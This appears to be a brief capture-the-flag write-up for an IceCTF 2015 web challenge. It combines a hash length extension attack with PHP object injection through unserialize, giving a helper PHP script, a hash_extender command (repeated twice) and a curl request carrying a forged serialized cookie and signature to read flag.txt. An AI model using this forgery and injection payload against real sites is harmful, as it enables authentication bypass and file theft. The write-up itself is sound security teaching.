This is some difficult

First, the auth code is vulnerable to a length extension attack. Also, passing user input to unserialize is dangerous.

Begin by creation `test.php` with the following contents:

```php
<?php
include("config.php");
include("classes.php");
$f = new File("flag.txt");
echo serialize($f);
```

Take that, and reverse it, and use length extension to append that.

Next, use the guide here: [https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack?utm_source=rss&utm_medium=rss&utm_campaign=plaidctf-web-150-mtpox-hash-extension-attack](here), to exploit the length extension. 

./hash_extender --data ';0:b' -s 25379ccdaefc067c701659406dad068fe5dacefa53a45a9fdf402b8942c247c2 --append '};"txt.galf":8:s;"emanelif":8:s{:1:"eliF":4:O' --secret-min=32 --secret-max=32 --out-data-format=html

curl -b "auth=O%3a4%3a%22File%22%3a1%3a%7bs%3a8%3a%22filename%22%3bs%3a8%3a%22flag%2etxt%22%3b%7d+%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; sig=76eefb902017f810c3c1afd05952f507017b9c58a1b6406422dbb31df0188e9b" http://web2015.icec.tf/giga/files.php

./hash_extender --data ';0:b' -s 25379ccdaefc067c701659406dad068fe5dacefa53a45a9fdf402b8942c247c2 --append '};"txt.galf":8:s;"emanelif":8:s{:1:"eliF":4:O' --secret-min=32 --secret-max=32 --out-data-format=html